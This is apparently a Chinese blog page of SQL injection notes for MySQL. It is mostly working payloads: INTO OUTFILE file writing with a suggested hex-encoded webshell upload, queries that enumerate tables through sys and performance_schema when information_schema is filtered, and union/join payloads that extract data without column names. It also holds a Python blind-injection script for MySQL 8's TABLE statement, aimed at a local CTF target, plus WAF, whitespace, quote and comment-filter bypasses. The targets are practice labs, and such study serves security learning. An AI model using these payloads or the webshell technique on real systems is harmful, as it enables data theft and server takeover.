<h3 id="导入导出文件into-outfile-参数"><a href="#导入导出文件into-outfile-参数" class="headerlink" title="导入导出文件into outfile 参数"></a>导入导出文件into outfile 参数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-46</span><span class="hljs-operator">/</span>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile &quot;c:\\wamp\\www\\sqllib\\test<br>1.txt&quot;<br># 将查询结果导入到文件当中<br># 那这个时候我们可以考虑上传网马，利用lines terminated <span class="hljs-keyword">by</span><br><span class="hljs-keyword">Into</span> outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated <span class="hljs-keyword">by</span> <span class="hljs-number">0</span>x(网马进行<span class="hljs-number">16</span> 进制转<br>换)<br></code></pre></td></tr></table></figure>

<h2 id="六、常见bypass"><a href="#六、常见bypass" class="headerlink" title="六、常见bypass"></a>六、常见bypass</h2><p><a target="_blank" rel="noopener" href="http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">SQL注入绕过技巧 | 瓦都剋 (dropsec.xyz)</a></p>
<h3 id="Information-schema被屏蔽或过滤or时"><a href="#Information-schema被屏蔽或过滤or时" class="headerlink" title="Information_schema被屏蔽或过滤or时"></a>Information_schema被屏蔽或过滤or时</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema - 安全客，安全资讯平台 (anquanke.com)</a></p>
<h4 id="MySQL5-7的新特性"><a href="#MySQL5-7的新特性" class="headerlink" title="MySQL5.7的新特性"></a>MySQL5.7的新特性</h4><blockquote>
<p>由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</p>
</blockquote>
<h4 id="innodb表–查找当前数据库的现存表"><a href="#innodb表–查找当前数据库的现存表" class="headerlink" title="innodb表–查找当前数据库的现存表"></a><strong>innodb表</strong>–查找当前数据库的现存表</h4><p>MySQL 5.6 及以上版本存在innodb_index_stats，innodb_table_stats两张表，其中包含新建立的库和表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name <span class="hljs-operator">=</span> database(); # 返回去重过后的表名(简洁)<br><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> mysql.innodb_index_stats <span class="hljs-keyword">where</span> database_name <span class="hljs-operator">=</span> database(); # 返回值中会出现重复的表名<br></code></pre></td></tr></table></figure>

<h4 id="sys表"><a href="#sys表" class="headerlink" title="sys表"></a>sys表</h4><p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql">#包含<span class="hljs-keyword">in</span><br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `sys`.`x$innodb_buffer_stats_by_table` <span class="hljs-keyword">where</span> object_schema <span class="hljs-operator">=</span> database();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `sys`.`innodb_buffer_stats_by_table` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$schema_index_statistics` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`schema_auto_increment_columns` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> table_schema <span class="hljs-keyword">FROM</span> sys.schema_table_statistics <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_schema;<br>#不包含<span class="hljs-keyword">in</span><br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$schema_flattened_keys` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$ps_schema_table_statistics_io` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> TABLE_NAME <span class="hljs-keyword">FROM</span> `sys`.`x$schema_table_statistics_with_buffer` <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> table_schema <span class="hljs-keyword">FROM</span> sys.x$schema_flattened_keys <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_schema;<br>#通过表文件的存储路径获取表名<br><span class="hljs-keyword">SELECT</span> FILE <span class="hljs-keyword">FROM</span> `sys`.`io_global_by_file_by_bytes` <span class="hljs-keyword">WHERE</span> FILE REGEXP DATABASE();<br><span class="hljs-keyword">SELECT</span> FILE <span class="hljs-keyword">FROM</span> `sys`.`io_global_by_file_by_latency` <span class="hljs-keyword">WHERE</span> FILE REGEXP DATABASE();<br><span class="hljs-keyword">SELECT</span> FILE <span class="hljs-keyword">FROM</span> `sys`.`x$io_global_by_file_by_bytes` <span class="hljs-keyword">WHERE</span> FILE REGEXP DATABASE();<br><br>#查询指定库的表（若无则说明此表从未被访问）<br><span class="hljs-keyword">SELECT</span> table_name <span class="hljs-keyword">FROM</span> sys.schema_table_statistics <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;mspwd&#x27;</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_name;<br><span class="hljs-keyword">SELECT</span> table_name <span class="hljs-keyword">FROM</span> sys.x$schema_flattened_keys <span class="hljs-keyword">WHERE</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;mspwd&#x27;</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> table_name;<br>#统计所有访问过的表次数:库名,表名,访问次数<br><span class="hljs-keyword">select</span> table_schema,table_name,<span class="hljs-built_in">sum</span>(io_read_requests<span class="hljs-operator">+</span>io_write_requests) io <span class="hljs-keyword">from</span> sys.schema_table_statistics <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span><br>table_schema,table_name <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> io <span class="hljs-keyword">desc</span>;<br>#查看所有正在连接的用户详细信息<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>,db,command,current_statement,last_statement,<span class="hljs-type">time</span> <span class="hljs-keyword">FROM</span> sys.session;<br>#查看所有曾连接数据库的IP,总连接次数<br><span class="hljs-keyword">SELECT</span> host,total_connections <span class="hljs-keyword">FROM</span> sys.host_summary;<br># 包含之前查询记录的表<br><span class="hljs-keyword">SELECT</span> QUERY <span class="hljs-keyword">FROM</span> sys.x$statement_analysis <span class="hljs-keyword">WHERE</span> QUERY REGEXP DATABASE();<br><span class="hljs-keyword">SELECT</span> QUERY <span class="hljs-keyword">FROM</span> `sys`.`statement_analysis` <span class="hljs-keyword">where</span> QUERY REGEXP DATABASE();<br></code></pre></td></tr></table></figure>

<h4 id="performance-schema表"><a href="#performance-schema表" class="headerlink" title="performance_schema表"></a>performance_schema表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`objects_summary_global_by_type` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_handles` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_index_usage` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_io_waits_summary_by_table` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br><span class="hljs-keyword">SELECT</span> object_name <span class="hljs-keyword">FROM</span> `performance_schema`.`table_lock_waits_summary_by_table` <span class="hljs-keyword">WHERE</span> object_schema <span class="hljs-operator">=</span> DATABASE();<br>#包含之前查询记录的表<br><span class="hljs-keyword">SELECT</span> digest_text <span class="hljs-keyword">FROM</span> `performance_schema`.`events_statements_summary_by_digest` <span class="hljs-keyword">WHERE</span> digest_text REGEXP DATABASE();<br>#包含表文件路径的表<br><span class="hljs-keyword">SELECT</span> file_name <span class="hljs-keyword">FROM</span> `performance_schema`.`file_instances` <span class="hljs-keyword">WHERE</span> file_name REGEXP DATABASE();<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232923.jpg" srcset="/img/loading.gif" lazyload alt="image-20220707221836224"></p>
<blockquote>
<p>上诉表格中虽然有能够查列名的表，但是查出来的数据都不全，当知道flag所在的库和表名时，但无法获取到列名，就需要利用无列名盲注了</p>
</blockquote>
<h4 id="join无列名注入-payload"><a href="#join无列名注入-payload" class="headerlink" title="join无列名注入 payload"></a>join无列名注入 payload</h4><p><strong>join … using(xx)</strong></p>
<p>查表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-keyword">from</span> sys.schema_auto_increment_columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-comment">--+</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name)<span class="hljs-keyword">from</span> sys.schema_table_statistics_with_buffer <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-comment">--+</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> mysql.innodb_table_stats <span class="hljs-keyword">where</span> database_name<span class="hljs-operator">=</span>database()<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>Union all 与union 的区别是增加了去重的功能</p>
</blockquote>
<p>查列名(适用于逗号被过滤)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"># <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> 重命名法<br><span class="hljs-keyword">select</span> c <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> a, <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> b, <span class="hljs-number">1</span> <span class="hljs-keyword">as</span> c <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test)x limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">1</span>;<br>#无逗号，有<span class="hljs-keyword">join</span>版本<br><span class="hljs-keyword">select</span> a <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> `a`)m <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span> `b`)n <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span> `c`)t <span class="hljs-keyword">where</span> <span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test)x;<br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users b)c<span class="hljs-comment">--+</span><br># 获取第一列的列名<br><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> users b <span class="hljs-keyword">using</span>(id,username))c<span class="hljs-comment">--+</span><br># 获取次列及后续列名<br></code></pre></td></tr></table></figure>

<h4 id="union-select重命名法"><a href="#union-select重命名法" class="headerlink" title="union select重命名法"></a><code>union select重命名法</code></h4><p>不获取列名情况下查列,以查第二列为例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> group_concat(b) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)a;<br># 也可以查多个列<br><span class="hljs-keyword">select</span> concat(`<span class="hljs-number">2</span>`,<span class="hljs-number">0x2d</span>,`<span class="hljs-number">3</span>`) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> admin)a limit <span class="hljs-number">1</span>,<span class="hljs-number">3</span>;<br># <span class="hljs-number">0x2d</span>会转换成字符<span class="hljs-string">&#x27;-&#x27;</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>这里将第二列取别名为b(如果反引号&#96;没被过滤，可以不取别名，直接用⬇️)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> `<span class="hljs-number">2</span>` <span class="hljs-keyword">from</span> ……<br></code></pre></td></tr></table></figure>

<p>结尾的a可以替换成任意字符，这是用来命名的</p>
<p>原理是联合查询时列名显示的是前一个select的结果，这里第一个select是<code>select 1,2 as b,3 </code>将列名重命名为1 b 3，然后再将这个新表命名为a，再进行查询</p>
</blockquote>
<h3 id="select被过滤"><a href="#select被过滤" class="headerlink" title="select被过滤"></a>select被过滤</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/275528.html">基于mysql8特性的sql注入 - FreeBuf网络安全行业门户</a></p>
<p>mysql 8.0.19<code>新增语句</code>table </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">table</span> users; <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>table不能加where子句，不允许行过滤，显示所有列，但可以用来盲注表名</p>
</blockquote>
<h4 id="table盲注脚本"><a href="#table盲注脚本" class="headerlink" title="table盲注脚本"></a>table盲注脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment">#orio1e</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">str2hex</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>	result=<span class="hljs-string">&#x27;0x&#x27;</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>		result+=<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:]<br>	<span class="hljs-keyword">return</span> result<br>dic=[<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>,<br>         <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>,]  <span class="hljs-comment"># 字典</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">35</span>):<br>	<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(dic)):<br>		<span class="hljs-built_in">print</span>(dic[j])<br>		url=<span class="hljs-string">&quot;http://127.0.0.1:8010&quot;</span><br>		<span class="hljs-comment">#第一个字段</span><br>		<span class="hljs-comment">#结果:1</span><br>		payload=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd\\&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;||(&#123;&#125;,0x21,0x21)&lt;(table/**/admin_user/**/limit/**/1)#&quot;</span>.<span class="hljs-built_in">format</span>(str2hex(result+dic[j]))&#125;<br>		<span class="hljs-comment">#爆第二个字段</span><br>		<span class="hljs-comment">#结果:guest</span><br>		payload=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd\\&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;||(0x31,&#123;&#125;,0x21)&lt;(table/**/admin_user/**/limit/**/1)#&quot;</span>.<span class="hljs-built_in">format</span>(str2hex(result+dic[j]))&#125;<br>		<span class="hljs-comment">#爆第三个字段</span><br>		<span class="hljs-comment">#结果:123456</span><br>		<span class="hljs-comment">#因为最后一个字符完成后长度相等又判断为假 所以最后一个字符应为其下一个字母</span><br>		<span class="hljs-comment">#但是这仅限最后一个字段</span><br>		<span class="hljs-comment">#所以正确结果是we1c0mehacker </span><br>		payload=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd\\&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;||(0x31,0x61646d696e,&#123;&#125;)&lt;(table/**/users/**/limit/**/1)#&quot;</span>.<span class="hljs-built_in">format</span>(str2hex(result+dic[j]))&#125;<br>		<br>		res=requests.post(url=url,data=payload)<br>		<span class="hljs-built_in">print</span>(payload)<br>		<span class="hljs-built_in">print</span>(res.text[-<span class="hljs-number">20</span>:])<br>		<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;emmmmm&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>			<span class="hljs-keyword">continue</span><br>		<span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;no&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>			<span class="hljs-comment">#返回假时表示上一个字母即为正确结果</span><br>			result+=dic[j-<span class="hljs-number">1</span>]<br>			<span class="hljs-keyword">break</span><br><br>	<span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>

<blockquote>
<p>注意往前回溯</p>
<p>mysql比较，从第一个字符还是比较ascii的大小，一次往后 ,并且多列的比较时从第一列的第一位开始的</p>
<p>mysql中对char型大小写是不敏感的，盲注的时候要么可以使用hex或者binary。</p>
</blockquote>
<h4 id="values注入"><a href="#values注入" class="headerlink" title="values注入"></a>values注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> `test`.`log`(`log`) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;$log&#x27;</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> `test`.`log`(`log`) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;testsetset&#x27;</span><span class="hljs-keyword">or</span> sleep(<span class="hljs-number">5</span>)) # <span class="hljs-string">&#x27;);</span><br><span class="hljs-string">insert into `test`.`log`(`log`) VALUES(&#x27;</span>testsetset<span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e))) # &#x27;</span>)<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> `test`.`log`(`log`) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">+</span>if((<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>),sleep(<span class="hljs-number">2</span>),<span class="hljs-number">1</span>)) # <span class="hljs-string">&#x27;)</span><br></code></pre></td></tr></table></figure>

<p>可以利用联合注入代替order by</p>
<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232669.jpg" srcset="/img/loading.gif" lazyload alt="image-20220707223820177"></p>
<h3 id="WAF绕过–服务器解析漏洞"><a href="#WAF绕过–服务器解析漏洞" class="headerlink" title="WAF绕过–服务器解析漏洞"></a>WAF绕过–服务器解析漏洞</h3><p>index.php?id&#x3D;1&amp;id&#x3D;2</p>
<blockquote>
<p>apache（php）解析最后一个参数，即显示id&#x3D;2 的内容。Tomcat（jsp）解析第一个参数，即显示id&#x3D;1 的内容。</p>
<p>我们往往在tomcat 服务器处做数据过滤和处理，功能类似为一个WAF，因此可以传入第一个为合法参数，第二个采用注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232308.jpg" srcset="/img/loading.gif" lazyload alt="image-20220708192908674"></p>
</blockquote>
<h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">/**/替代空格<br><span class="hljs-meta prompt_">%</span><span class="language-bash">09 TAB 键（水平）</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0a 新建一行</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0c 新的一页</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0d <span class="hljs-built_in">return</span> 功能</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">0b TAB 键（垂直）</span><br><span class="hljs-meta prompt_">%</span><span class="language-bash">a0 空格</span><br>() 代替空格，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。<br></code></pre></td></tr></table></figure>

<blockquote>
<p>%a0是一个不成汉字的中文字符，因此正则匹配时不会当空格过滤，而进入sql语句后，mysql不认中文字符，当空格处理</p>
</blockquote>
<h3 id="过滤单引号"><a href="#过滤单引号" class="headerlink" title="过滤单引号"></a>过滤单引号</h3><p>转义符号及注释没被过滤时，将username闭合的单引号转义，在password的输入中插入布尔盲注语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>admin\<br>password<span class="hljs-operator">=</span><span class="hljs-keyword">or</span> <span class="hljs-number">2</span><span class="hljs-operator">&gt;</span><span class="hljs-number">1</span>#<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;admin\&#x27;</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27; or 2&gt;1#&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h4 id="多种注释符"><a href="#多种注释符" class="headerlink" title="多种注释符"></a>多种注释符</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span><br><span class="hljs-comment">--%20</span><br><span class="hljs-comment">/**/</span><br>#<br><span class="hljs-comment">--+</span><br><span class="hljs-comment">-- -</span><br><span class="hljs-operator">%</span><span class="hljs-number">00</span><br>;<br>;<span class="hljs-operator">%</span><span class="hljs-number">00</span><br>;\x00<br></code></pre></td></tr></table></figure>

